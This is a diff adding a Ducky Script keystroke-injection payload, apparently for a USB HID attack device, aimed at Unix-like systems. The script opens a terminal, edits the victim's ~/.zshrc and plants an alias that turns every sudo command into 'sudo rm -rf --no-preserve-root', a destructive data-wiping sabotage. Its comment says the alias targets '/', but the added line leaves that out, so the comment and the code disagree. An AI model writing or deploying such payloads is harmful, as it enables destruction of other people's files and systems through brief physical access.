@@ -1,0 +1,20 @@
+REM Changes sudo to 'sudo rm -rf / --no-preserve-root'
+REM Target Unix-like
+DELAY 1000
+CTRL-ALT t
+DELAY 500
+STRING nano ~/.zshrc
+DELAY 500
+CTRL w
+DELAY 150
+STRING alias ls=
+ENTER
+DELAY 150
+END
+ENTER
+SPACE
+REPEAT 3
+STRING alias sudo='sudo rm -rf --no-preserve-root'
+CTRL o
+DELAY 150
+ENTER
